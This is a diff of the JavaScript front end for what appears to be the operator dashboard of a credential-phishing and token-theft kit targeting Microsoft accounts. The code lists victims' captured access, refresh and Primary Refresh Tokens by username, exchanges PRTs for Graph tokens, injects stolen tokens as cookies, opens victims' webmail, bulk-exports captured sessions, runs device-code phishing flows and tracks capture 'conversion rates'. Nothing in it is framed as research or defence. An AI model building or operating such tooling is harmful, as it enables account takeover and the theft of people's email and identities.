-                const res = await api('/webmail/folders', { method: 'POST', body: { accessToken: token } });
-                document.getElementById('webmailFolders').innerHTML = '<h4>📁 Folders</h4>' +
-                    res.folders.map(f => `<div style="padding:4px 0">📁 ${f.displayName} (${f.childFolderCount || 0} subfolders) — ${f.totalItemCount || 0} items</div>`).join('');
-            } catch (e) { showToast('Failed to load folders', true); }
-        }
+    async function exchangePRT(prt) { try { const res = await fetch('/dash/api/prt/exchange', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ prt }) }); const data = await res.json(); if (data.success && data.data?.access_token) { showToast('✅ PRT exchanged!'); localStorage.setItem('evil_token', JSON.stringify(data.data)); window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank'); } else showToast('❌ PRT exchange failed', true); } catch (e) { showToast('❌ Error: ' + e.message, true); } }
 
-        async function loadEmails(folderId) {
-            const token = document.getElementById('webmailToken').value.trim();
-            if (!token) { showToast('Paste an access token first', true); return; }
-            try {
-                const res = await api('/webmail/emails', { method: 'POST', body: { accessToken: token, folderId } });
-                document.getElementById('webmailEmails').innerHTML = '<h4>📧 ' + folderId + ' (' + res.count + ' emails)</h4>' +
-                    (res.emails || []).map(e => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">
-                        <strong>${e.subject || '(no subject)'}</strong> — ${e.sender?.emailAddress?.name || 'Unknown'} — ${new Date(e.receivedDateTime).toLocaleString()}
-                    </div>`).join('');
-            } catch (e) { showToast('Failed to load emails', true); }
-        }
+    async function exportAll() { try { const res = await fetch('/dash/api/export/all'); if (!res.ok) throw new Error('Export failed'); const blob = await res.blob(); const url = window.URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'all_sessions.zip'; a.click(); showToast('✅ Exported!'); } catch (e) { showToast('❌ Error: ' + e.message, true); } }
 
-        // ============================================================
-        // 🚀 INIT
-        // ============================================================
-        refreshAll();
-        loadRecentSessions();
-        setInterval(refreshAll, 60000);
-    </script>
+    function closeModal() { document.getElementById('modal').style.display = 'none'; }
+    document.getElementById('modal').addEventListener('click', function(e) { if (e.target === this) closeModal(); });
+
+    // =============================================
+    // VAULT
+    // =============================================
+    async function scanVault() { try { const res = await fetch('/dash/api/vault/scan', { method: 'POST' }); const data = await res.json(); if (data.success) { showToast(`✅ Found ${data.count} tokens.`); loadVault(); } } catch (e) { showToast('❌ Scan failed: ' + e.message, true); } }
+    async function healthCheckVault() { try { const res = await fetch('/dash/api/vault/healthcheck', { method: 'POST' }); const data = await res.json(); if (data.success) { const valid = data.results.filter(r => r.status === 'valid').length; showToast(`✅ ${valid} valid, ${data.results.length - valid} expired.`); loadVault(); } } catch (e) { showToast('❌ Error: ' + e.message, true); } }
+    async function loadVault() {
+        try { const res = await fetch('/dash/api/vault/tokens'); const data = await res.json(); if (!data.success) return; vaultTokens = data.tokens || []; const sr = await fetch('/dash/api/vault/stats'); const sd = await sr.json(); if (sd.success) document.getElementById('vaultStats').textContent = `📊 ${sd.stats.total} tokens · ${sd.stats.access} access · ${sd.stats.refresh} refresh · ${sd.stats.prt} PRT`; const tbody = document.getElementById('vaultTable'); if (vaultTokens.length === 0) { tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No tokens. Click "Scan Logs".</td></tr>'; return; } tbody.innerHTML = ''; vaultTokens.slice(0,50).forEach(t => { const row = document.createElement('tr'); row.innerHTML = `<td>${t.username||'Unknown'}</td><td><span class="badge">🔑 ${t.type}</span></td><td><span class="badge badge-success">✅ Valid</span></td><td style="font-size:12px;color:rgba(255,255,255,0.4);">${t.file||'N/A'}</td><td style="font-size:12px;color:rgba(255,255,255,0.4);">${t.timestamp?new Date(t.timestamp).toLocaleString():'N/A'}</td><td><button class="action-btn cookie" onclick="injectTokenAsCookie('${t.value}')">🍪 Inject</button><button class="action-btn" onclick="openWebmail('${t.value}','${t.username||'User'}')">📧 Webmail</button><button class="action-btn" onclick="navigator.clipboard.writeText('${t.value}')">📋 Copy</button></td>`; tbody.appendChild(row); }); } catch (e) { console.error('Vault load error:', e); }
+    }
+
+    // =============================================
+    // PRT
+    // =============================================
+    async function scanPRTs() { try { const res = await fetch('/dash/api/prt/scan', { method: 'POST' }); const data = await res.json(); if (data.success) { showToast(`✅ Found ${data.count} PRTs`); loadPRTs(); } } catch (e) { showToast('❌ Error: ' + e.message, true); } }
+    async function loadPRTs() {
+        try { const res = await fetch('/dash/api/prt/list'); const data = await res.json(); if (!data.success) return; const prts = data.prts || []; document.getElementById('prtTotal').textContent = prts.length; document.getElementById('prtUsers').textContent = new Set(prts.map(p=>p.username)).size; document.getElementById('prtHealthy').textContent = prts.filter(p=>p.last_refresh).length; document.getElementById('prtStats').textContent = `📊 ${prts.length} PRTs · ${new Set(prts.map(p=>p.username)).size} users`; const tbody = document.getElementById('prtTable'); if (prts.length === 0) { tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No PRTs found.</td></tr>'; return; } tbody.innerHTML = ''; prts.forEach(p => { const row = document.createElement('tr'); row.innerHTML = `<td>${p.username||'Unknown'}</td><td style="font-family:monospace;font-size:11px;">${p.prt.slice(0,30)}...</td><td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.source||'N/A'}</td><td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.timestamp?new Date(p.timestamp).toLocaleString():'N/A'}</td><td><span class="badge badge-success">✅ Active</span></td><td><button class="action-btn cookie" onclick="exchangePRT('${p.prt}')">🔄 Exchange</button><button class="action-btn" onclick="injectTokenAsCookie('${p.prt}')">🍪 Inject</button></td>`; tbody.appendChild(row); }); } catch (e) { console.error('PRT load error:', e); }
+    }
+    async function healthCheckPRTs() { try { const res = await fetch('/dash/api/prt/health-all', { method: 'POST' }); const data = await res.json(); if (data.success) { const valid = data.results.filter(r=>r.valid).length; showToast(`✅ ${valid} valid, ${data.results.length-valid} invalid`); loadPRTs(); } } catch (e) { showToast('❌ Error: ' + e.message, true); } }
+    async function exchangeAllPRTs() { if (!confirm('Exchange all PRTs?')) return; try { const res = await fetch('/dash/api/prt/exchange-all', { method: 'POST' }); const data = await res.json(); if (data.success) { const ok = data.results.filter(r=>r.success).length; showToast(`✅ ${ok} exchanged`); loadPRTs(); } } catch (e) { showToast('❌ Error: ' + e.message, true); } }
+
+    // =============================================
+    // ANALYTICS
+    // =============================================
+    async function loadAnalytics() {
+        try { const res = await fetch('/dash/api/analytics'); const data = await res.json(); if (!data.success) return; const a = data.analytics; document.getElementById('analyticsVisits').textContent = a.visits.total; document.getElementById('analyticsCaptures').textContent = a.captures.total; document.getElementById('analyticsConversion').textContent = a.conversionRate.total + '%'; document.getElementById('analyticsUniqueIPs').textContent = a.uniqueIPs; document.getElementById('topDomainsList').innerHTML = (a.topDomains||[]).map(d=>`<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>${d.domain}</span><span>${d.count}</span></div>`).join('')||'<p style="color:rgba(255,255,255,0.3);">No data</p>'; document.getElementById('conversionDetails').innerHTML = `<div style="display:flex;justify-content:space-between;padding:4px 0;">Today: ${a.conversionRate.today}% (${a.captures.today}/${a.visits.today})</div><div style="display:flex;justify-content:space-between;padding:4px 0;">Week: ${a.conversionRate.week}% (${a.captures.week}/${a.visits.week})</div><div style="display:flex;justify-content:space-between;padding:4px 0;">Month: ${a.conversionRate.month}% (${a.captures.month}/${a.visits.month})</div>`; const ctx = document.getElementById('analyticsChart').getContext('2d'); if (analyticsChart) analyticsChart.destroy(); analyticsChart = new Chart(ctx, { type: 'bar', data: { labels: Object.keys(a.dailyCaptures||{}), datasets: [{ label: 'Captures', data: Object.values(a.dailyCaptures||{}), backgroundColor: 'rgba(130,177,255,0.4)', borderColor: '#82b1ff', borderWidth: 2, borderRadius: 8 }, { label: 'Visits', data: Object.values(a.dailyVisits||{}), backgroundColor: 'rgba(255,215,0,0.2)', borderColor: '#ffd700', borderWidth: 2, borderRadius: 8 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#a0b0c0' } } }, scales: { y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { ticks: { color: '#a0b0c0' }, grid: { display: false } } } } }); } catch (e) { console.error('Analytics error:', e); }
+    }
+
+    // =============================================
+    // DEVICE
+    // =============================================
+    function startDeviceFlow() { window.open('/device', '_blank'); setTimeout(refreshDeviceHistory, 3000); }
+    async function refreshDeviceHistory() { try { const res = await fetch('/dash/api/device/history'); const data = await res.json(); if (!data.success) return; deviceHistory = data.flows || []; const tbody = document.getElementById('deviceHistoryTable'); if (deviceHistory.length === 0) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No device flows yet.</td></tr>'; } else { tbody.innerHTML = ''; deviceHistory.slice(0,50).forEach(f => { const row = document.createElement('tr'); row.innerHTML = `<td><code>${f.user_code}</code></td><td><span class="badge ${f.status==='approved'?'badge-success':f.status==='expired'?'badge-danger':'badge-warning'}">${f.status}</span></td><td>${new Date(f.created).toLocaleString()}</td><td>${f.approved?new Date(f.approved).toLocaleString():'—'}</td><td>${f.access_token?`<button class="action-btn cookie" onclick="injectTokenAsCookie('${f.access_token}')">🍪 Inject</button><button class="action-btn" onclick="openWebmail('${f.access_token}','${f.username||'User'}')">📧 Webmail</button>`:'—'}</td>`; tbody.appendChild(row); }); } const pending = deviceHistory.filter(f=>f.status==='pending').length; const approved = deviceHistory.filter(f=>f.status==='approved').length; const expired = deviceHistory.filter(f=>f.status==='expired').length; document.getElementById('activeFlows').textContent = pending; document.getElementById('approvedFlows').textContent = approved; document.getElementById('expiredFlows').textContent = expired; document.getElementById('deviceStats').textContent = `📊 ${deviceHistory.length} flows · ${approved} approved`; } catch (e) { console.error('Device history error:', e); } }
+
+    // =============================================
+    // INIT
+    // =============================================
+    connectWebSocket(); refreshLogs(); setInterval(refreshLogs, 15000);
+    window.addEventListener('load', () => { if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); } });
+</script>
 </body>
 </html>
